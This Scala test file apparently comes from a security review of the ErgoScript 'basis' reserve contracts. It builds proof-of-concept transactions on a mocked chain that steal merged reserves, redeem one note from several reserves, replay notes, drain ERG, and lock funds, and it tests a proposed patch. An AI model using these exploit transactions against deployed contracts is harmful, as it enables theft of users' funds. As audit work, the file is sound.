package basis.contracts

import basis.offchain.SigUtils
import com.google.common.primitives.Longs
import org.ergoplatform.appkit.impl.OutBoxImpl
import org.ergoplatform.appkit.{BlockchainContext, ConstantsBuilder, ContextVar, ErgoValue, InputBox}
import org.ergoplatform.sdk.ErgoToken
import org.scalatest.{Matchers, PropSpec}
import scorex.crypto.hash.Blake2b256
import scorex.util.encode.Base16
import sigma.AvlTree
import sigma.data.AvlTreeFlags
import sigma.serialization.GroupElementSerializer
import work.lithos.plasma.PlasmaParameters
import work.lithos.plasma.collections.PlasmaMap

// Security-review PoCs against contract/basis.es and contract/basis-token.es @ b6b1573.
// F-properties assert that an attack transaction is ACCEPTED (F6/F7: an honest one is blocked) by the current contract.
class IndependentReviewSpec extends PropSpec with Matchers with basis.HttpClientTesting {

  val b = new BasisSpec       // reuse its keys, tx builder and helpers (its own properties are not run from here)
  val t = new BasisTokenSpec

  val params = PlasmaParameters(32, None)
  val reserveFlags = AvlTreeFlags(insertAllowed = true, updateAllowed = true, removeAllowed = false)
  def freshMap = new PlasmaMap[Array[Byte], Array[Byte]](reserveFlags, params)

  val txA = "a1e5ce5aa0d95f5d54a7bc89c46730d9662397067250aa18a0039631c0f5b801"
  val txB = "a1e5ce5aa0d95f5d54a7bc89c46730d9662397067250aa18a0039631c0f5b802"
  val txC = "a1e5ce5aa0d95f5d54a7bc89c46730d9662397067250aa18a0039631c0f5b803"
  val nftA = "aa".padTo(64, 'a')
  val nftB = "bb".padTo(64, 'b')

  def sigBytes(s: (sigma.GroupElement, BigInt)): Array[Byte] = s._1.getEncoded.toArray ++ s._2.toByteArray

  def reserveBox(value: Long, tree: ErgoValue[AvlTree], tokens: Seq[ErgoToken], txId: String,
                 vars: Seq[ContextVar], r7: Option[Long] = None)(implicit ctx: BlockchainContext): InputBox = {
    val regs: Seq[ErgoValue[_]] = Seq(ErgoValue.of(b.ownerPk), tree, ErgoValue.of(b.trackerNFTBytes)) ++ r7.map(h => ErgoValue.of(h))
    val bld = ctx.newTxBuilder().outBoxBuilder.value(value).registers(regs: _*)
      .contract(ctx.compileContract(ConstantsBuilder.empty(), BasisConstants.basisContract))
    (if (tokens.isEmpty) bld else bld.tokens(tokens: _*)).build().convertToInputWith(txId, 0.toShort).withContextVars(vars: _*)
  }

  def plainBox(value: Long, txId: String, tokens: Seq[ErgoToken] = Nil)(implicit ctx: BlockchainContext): InputBox = {
    val bld = ctx.newTxBuilder().outBoxBuilder.value(value)
      .contract(ctx.compileContract(ConstantsBuilder.empty(), "sigmaProp(true)"))
    (if (tokens.isEmpty) bld else bld.tokens(tokens: _*)).build().convertToInputWith(txId, 0.toShort)
  }

  def run(ins: Array[InputBox], dis: Array[InputBox], outs: Array[OutBoxImpl], secrets: Array[String])
         (implicit ctx: BlockchainContext) =
    b.createTx(ins, dis, outs, fee = None, b.changeAddress, secrets, broadcast = false)

  // ---------------------------------------------------------------------------------------------
  property("F1: anyone can merge two fresh reserves via unsigned top-up and steal one of them") {
    createMockedErgoClient(MockData(Nil, Nil)).execute { implicit ctx: BlockchainContext =>
      val V = 50000000000L // 50 ERG each
      val topUp = 100000000L
      val v = Seq(new ContextVar(0, ErgoValue.of(10: Byte))) // action 1 (top up), BOTH point at output 0
      // Case (a): reserves without tokens; case (b): reserves carrying the same (non-unique) token id.
      for (tokens <- Seq(Seq.empty[ErgoToken], Seq(new ErgoToken(nftA, 1)))) {
        val r1 = reserveBox(V, b.emptyTreeErgoValue, tokens, txA, v)
        val r2 = reserveBox(V, b.emptyTreeErgoValue, tokens, txB, v)
        val funding = plainBox(topUp, txC)
        val merged = b.createOut(BasisConstants.basisContract, V + topUp,
          Array(ErgoValue.of(b.ownerPk), b.emptyTreeErgoValue, ErgoValue.of(b.trackerNFTBytes)), tokens.toArray)
        val loot = b.createOut(b.trueScript, V, Array(), tokens.toArray)
        noException should be thrownBy run(Array(r1, r2, funding), Array(), Array(merged, loot), Array())
      }
    }
  }

  // ---------------------------------------------------------------------------------------------
  property("F2: one note redeems in full from every reserve of the same owner+tracker") {
    createMockedErgoClient(MockData(Nil, Nil)).execute { implicit ctx: BlockchainContext =>
      val debt = 10000000000L // 10 ERG
      val ts = System.currentTimeMillis()
      val key = Blake2b256(b.ownerPk.getEncoded.toArray ++ b.receiverPk.getEncoded.toArray)
      val msg = key ++ Longs.toByteArray(debt) ++ Longs.toByteArray(ts)
      val ownerSig = sigBytes(SigUtils.sign(msg, b.ownerSecret))
      val trackerSig = sigBytes(SigUtils.sign(msg, b.trackerSecret))
      val tt = b.mkTrackerTreeAndProof(key, debt)
      val m = freshMap
      val empty = m.ergoValue
      val proof = m.insertOrUpdate(key -> (Longs.toByteArray(ts) ++ Longs.toByteArray(debt))).proof.bytes
      val next = m.ergoValue
      def vars(idx: Byte) = Seq(
        new ContextVar(0, ErgoValue.of(idx)), new ContextVar(1, ErgoValue.of(b.receiverPk)),
        new ContextVar(2, ErgoValue.of(ownerSig)), new ContextVar(3, ErgoValue.of(debt)),
        new ContextVar(4, ErgoValue.of(ts)), new ContextVar(5, ErgoValue.of(proof)),
        new ContextVar(6, ErgoValue.of(trackerSig)), new ContextVar(8, ErgoValue.of(tt.lookupProofBytes)))
      val r1 = reserveBox(b.minValue + debt, empty, Seq(new ErgoToken(nftA, 1)), txA, vars(0))
      val r2 = reserveBox(b.minValue + debt, empty, Seq(new ErgoToken(nftB, 1)), txB, vars(1))
      val tracker = b.mkTrackerDataInput(tt.tree)
      def out(nft: String) = b.createOut(BasisConstants.basisContract, b.minValue,
        Array(ErgoValue.of(b.ownerPk), next, ErgoValue.of(b.trackerNFTBytes)), Array(new ErgoToken(nft, 1)))
      val pay = b.createOut(b.trueScript, 2 * debt, Array(), Array())
      noException should be thrownBy run(Array(r1, r2), Array(tracker), Array(out(nftA), out(nftB), pay),
        Array(b.receiverSecret.toString()))
    }
  }

  // ---------------------------------------------------------------------------------------------
  property("F3: omitting context var #7 replays an already fully-redeemed note") {
    createMockedErgoClient(MockData(Nil, Nil)).execute { implicit ctx: BlockchainContext =>
      val debt = 10000000000L
      val ts = System.currentTimeMillis()
      val key = Blake2b256(b.ownerPk.getEncoded.toArray ++ b.receiverPk.getEncoded.toArray)
      val msg = key ++ Longs.toByteArray(debt) ++ Longs.toByteArray(ts)
      val ownerSig = sigBytes(SigUtils.sign(msg, b.ownerSecret))
      val trackerSig = sigBytes(SigUtils.sign(msg, b.trackerSecret))
      val tt = b.mkTrackerTreeAndProof(key, debt)
      val m = freshMap
      m.insertOrUpdate(key -> (Longs.toByteArray(ts) ++ Longs.toByteArray(debt))) // already fully redeemed on-chain
      val current = m.ergoValue
      // creditor claims redeemed=0 by not supplying #7; contract writes (ts, 0 + debt) via insertOrUpdate
      val proof = m.insertOrUpdate(key -> (Longs.toByteArray(ts) ++ Longs.toByteArray(debt))).proof.bytes
      val next = m.ergoValue
      val vars = Seq(
        new ContextVar(0, ErgoValue.of(0: Byte)), new ContextVar(1, ErgoValue.of(b.receiverPk)),
        new ContextVar(2, ErgoValue.of(ownerSig)), new ContextVar(3, ErgoValue.of(debt)),
        new ContextVar(4, ErgoValue.of(ts)), new ContextVar(5, ErgoValue.of(proof)),
        new ContextVar(6, ErgoValue.of(trackerSig)), new ContextVar(8, ErgoValue.of(tt.lookupProofBytes)))
      val r = reserveBox(b.minValue + debt, current, Seq(new ErgoToken(nftA, 1)), txA, vars)
      val out = b.createOut(BasisConstants.basisContract, b.minValue,
        Array(ErgoValue.of(b.ownerPk), next, ErgoValue.of(b.trackerNFTBytes)), Array(new ErgoToken(nftA, 1)))
      val pay = b.createOut(b.trueScript, debt, Array(), Array())
      noException should be thrownBy run(Array(r), Array(b.mkTrackerDataInput(tt.tree)), Array(out, pay),
        Array(b.receiverSecret.toString()))
    }
  }

  // ---------------------------------------------------------------------------------------------
  property("F4: basis-token: anyone can drain the reserve's ERG by topping up 1 token unit") {
    createMockedErgoClient(MockData(Nil, Nil)).execute { implicit ctx: BlockchainContext =>
      val ergInReserve = 20000000000L // 20 ERG sitting in a token reserve
      val keep = 1000000L             // leave 0.001 ERG in the reserve box
      val r = ctx.newTxBuilder().outBoxBuilder.value(ergInReserve)
        .tokens(new ErgoToken(t.reserveNFTBytes, 1), new ErgoToken(t.reserveTokenIdBytes, 1000))
        .registers(ErgoValue.of(t.ownerPk), t.emptyTreeErgoValue, ErgoValue.of(t.trackerNFTBytes))
        .contract(ctx.compileContract(ConstantsBuilder.empty(), BasisConstants.basisTokenContract))
        .build().convertToInputWith(txA, 0.toShort).withContextVars(new ContextVar(0, ErgoValue.of(10: Byte)))
      val funding = plainBox(keep, txB, Seq(new ErgoToken(t.reserveTokenIdBytes, 1)))
      val out = t.createOut(BasisConstants.basisTokenContract, keep,
        Array(ErgoValue.of(t.ownerPk), t.emptyTreeErgoValue, ErgoValue.of(t.trackerNFTBytes)),
        Array(new ErgoToken(t.reserveNFTBytes, 1), new ErgoToken(t.reserveTokenIdBytes, 1001)))
      val loot = b.createOut(b.trueScript, ergInReserve, Array(), Array())
      noException should be thrownBy run(Array(r, funding), Array(), Array(out, loot), Array())
    }
  }

  // ---------------------------------------------------------------------------------------------
  property("F5: a reserve created with R7 preset to a past height can be withdrawn immediately") {
    createMockedErgoClient(MockData(Nil, Nil)).execute { implicit ctx: BlockchainContext =>
      assert(ctx.getHeight > 43201, s"mock height ${ctx.getHeight} too low for this PoC")
      val r = reserveBox(b.minValue + 10000000000L, b.emptyTreeErgoValue, Seq(new ErgoToken(nftA, 1)), txA,
        Seq(new ContextVar(0, ErgoValue.of(30: Byte))), r7 = Some(1L))
      val out = b.createOut(b.trueScript, b.minValue + 10000000000L, Array(), Array(new ErgoToken(nftA, 1)))
      noException should be thrownBy run(Array(r), Array(), Array(out), Array(b.ownerSecret.toString()))
    }
  }

  // ---------------------------------------------------------------------------------------------
  property("F6: a reserve created with a pre-populated R5 blocks a creditor's redemption forever") {
    createMockedErgoClient(MockData(Nil, Nil)).execute { implicit ctx: BlockchainContext =>
      val debt = 10000000000L
      val ts = System.currentTimeMillis()
      val key = Blake2b256(b.ownerPk.getEncoded.toArray ++ b.receiverPk.getEncoded.toArray)
      val msg = key ++ Longs.toByteArray(debt) ++ Longs.toByteArray(ts)
      val ownerSig = sigBytes(SigUtils.sign(msg, b.ownerSecret))
      val trackerSig = sigBytes(SigUtils.sign(msg, b.trackerSecret))
      val tt = b.mkTrackerTreeAndProof(key, debt)
      val m = freshMap
      m.insert(key -> (Longs.toByteArray(Long.MaxValue) ++ Longs.toByteArray(Long.MaxValue))) // poisoned at creation
      val poisoned = m.ergoValue
      val lookup = m.lookUp(key).proof.bytes
      val proof = m.insertOrUpdate(key -> (Longs.toByteArray(ts) ++ Longs.toByteArray(debt))).proof.bytes
      val vars = Seq(
        new ContextVar(0, ErgoValue.of(0: Byte)), new ContextVar(1, ErgoValue.of(b.receiverPk)),
        new ContextVar(2, ErgoValue.of(ownerSig)), new ContextVar(3, ErgoValue.of(debt)),
        new ContextVar(4, ErgoValue.of(ts)), new ContextVar(5, ErgoValue.of(proof)),
        new ContextVar(6, ErgoValue.of(trackerSig)), new ContextVar(7, ErgoValue.of(lookup)),
        new ContextVar(8, ErgoValue.of(tt.lookupProofBytes)))
      val r = reserveBox(b.minValue + debt, poisoned, Seq(new ErgoToken(nftA, 1)), txA, vars)
      val out = b.createOut(BasisConstants.basisContract, b.minValue,
        Array(ErgoValue.of(b.ownerPk), m.ergoValue, ErgoValue.of(b.trackerNFTBytes)), Array(new ErgoToken(nftA, 1)))
      val pay = b.createOut(b.trueScript, debt, Array(), Array())
      an[Throwable] should be thrownBy run(Array(r), Array(b.mkTrackerDataInput(tt.tree)), Array(out, pay),
        Array(b.receiverSecret.toString()))
      // ...and omitting #7 (F3) is the only way around it, which is itself the replay bug.
    }
  }

  property("controls: F1/F4 shapes fail when the top-up amount is missing") {
    createMockedErgoClient(MockData(Nil, Nil)).execute { implicit ctx: BlockchainContext =>
      val V = 50000000000L
      val v = Seq(new ContextVar(0, ErgoValue.of(10: Byte)))
      val r1 = reserveBox(V, b.emptyTreeErgoValue, Nil, txA, v)
      val r2 = reserveBox(V, b.emptyTreeErgoValue, Nil, txB, v)
      val merged = b.createOut(BasisConstants.basisContract, V,
        Array(ErgoValue.of(b.ownerPk), b.emptyTreeErgoValue, ErgoValue.of(b.trackerNFTBytes)), Array())
      val loot = b.createOut(b.trueScript, V, Array(), Array())
      an[Throwable] should be thrownBy run(Array(r1, r2), Array(), Array(merged, loot), Array())

      val r = ctx.newTxBuilder().outBoxBuilder.value(V)
        .tokens(new ErgoToken(t.reserveNFTBytes, 1), new ErgoToken(t.reserveTokenIdBytes, 1000))
        .registers(ErgoValue.of(t.ownerPk), t.emptyTreeErgoValue, ErgoValue.of(t.trackerNFTBytes))
        .contract(ctx.compileContract(ConstantsBuilder.empty(), BasisConstants.basisTokenContract))
        .build().convertToInputWith(txA, 0.toShort).withContextVars(new ContextVar(0, ErgoValue.of(10: Byte)))
      val out = t.createOut(BasisConstants.basisTokenContract, 1000000L,
        Array(ErgoValue.of(t.ownerPk), t.emptyTreeErgoValue, ErgoValue.of(t.trackerNFTBytes)),
        Array(new ErgoToken(t.reserveNFTBytes, 1), new ErgoToken(t.reserveTokenIdBytes, 1000)))
      val loot2 = b.createOut(b.trueScript, V - 1000000L, Array(), Array())
      an[Throwable] should be thrownBy run(Array(r), Array(), Array(out, loot2), Array())
    }
  }

  // ---- checks on the proposed patch (src/test/resources/patched/basis-fixed.es) ----
  lazy val patchedSrc = scala.io.Source.fromFile("src/test/resources/patched/basis-fixed.es", "UTF-8").mkString

  def patchedReserve(value: Long, tokens: Seq[ErgoToken], txId: String, vars: Seq[ContextVar], r7: Option[Long] = None)
                    (implicit ctx: BlockchainContext): InputBox = {
    val regs: Seq[ErgoValue[_]] = Seq(ErgoValue.of(b.ownerPk), b.emptyTreeErgoValue, ErgoValue.of(b.trackerNFTBytes)) ++ r7.map(h => ErgoValue.of(h))
    val bld = ctx.newTxBuilder().outBoxBuilder.value(value).registers(regs: _*)
      .contract(ctx.compileContract(ConstantsBuilder.empty(), patchedSrc))
    (if (tokens.isEmpty) bld else bld.tokens(tokens: _*)).build().convertToInputWith(txId, 0.toShort).withContextVars(vars: _*)
  }

  property("P1: patched contract rejects the unsigned top-up merge (shared token)") {
    createMockedErgoClient(MockData(Nil, Nil)).execute { implicit ctx: BlockchainContext =>
      val V = 50000000000L; val topUp = 100000000L
      val v = Seq(new ContextVar(0, ErgoValue.of(10: Byte)))
      val tokens = Seq(new ErgoToken(nftA, 1))
      val r1 = patchedReserve(V, tokens, txA, v); val r2 = patchedReserve(V, tokens, txB, v)
      val merged = b.createOut(patchedSrc, V + topUp,
        Array(ErgoValue.of(b.ownerPk), b.emptyTreeErgoValue, ErgoValue.of(b.trackerNFTBytes)), tokens.toArray)
      val loot = b.createOut(b.trueScript, V, Array(), tokens.toArray)
      an[Throwable] should be thrownBy run(Array(r1, r2, plainBox(topUp, txC)), Array(), Array(merged, loot), Array())
    }
  }

  property("P2: patched contract still lets the owner refund a token-less reserve (no bricking)") {
    createMockedErgoClient(MockData(Nil, Nil)).execute { implicit ctx: BlockchainContext =>
      val r = patchedReserve(b.minValue, Nil, txA, Seq(new ContextVar(0, ErgoValue.of(30: Byte))),
        r7 = Some(ctx.getHeight.toLong - 43200))
      val out = b.createOut(b.trueScript, b.minValue, Array(), Array())
      noException should be thrownBy run(Array(r), Array(), Array(out), Array(b.ownerSecret.toString()))
    }
  }

  property("F7: a reserve whose R7 is an Int (not Long) cannot be spent by any action") {
    createMockedErgoClient(MockData(Nil, Nil)).execute { implicit ctx: BlockchainContext =>
      def box(action: Byte) = ctx.newTxBuilder().outBoxBuilder.value(b.minValue)
        .tokens(new ErgoToken(nftA, 1))
        .registers(ErgoValue.of(b.ownerPk), b.emptyTreeErgoValue, ErgoValue.of(b.trackerNFTBytes), ErgoValue.of(0))
        .contract(ctx.compileContract(ConstantsBuilder.empty(), BasisConstants.basisContract))
        .build().convertToInputWith(txA, 0.toShort).withContextVars(new ContextVar(0, ErgoValue.of(action)))
      // top-up (the cheapest path, unsigned) with a correctly-typed output R7 = 0L
      val topped = b.createOut(BasisConstants.basisContract, b.minValue + 100000000L,
        Array(ErgoValue.of(b.ownerPk), b.emptyTreeErgoValue, ErgoValue.of(b.trackerNFTBytes), ErgoValue.of(0L)),
        Array(new ErgoToken(nftA, 1)))
      an[Throwable] should be thrownBy run(Array(box(10), plainBox(100000000L, txB)), Array(), Array(topped), Array())
      // initiate refund by the owner
      val init = b.createOut(BasisConstants.basisContract, b.minValue,
        Array(ErgoValue.of(b.ownerPk), b.emptyTreeErgoValue, ErgoValue.of(b.trackerNFTBytes), ErgoValue.of(ctx.getHeight.toLong)),
        Array(new ErgoToken(nftA, 1)))
      an[Throwable] should be thrownBy run(Array(box(20)), Array(), Array(init), Array(b.ownerSecret.toString()))
    }
  }
}
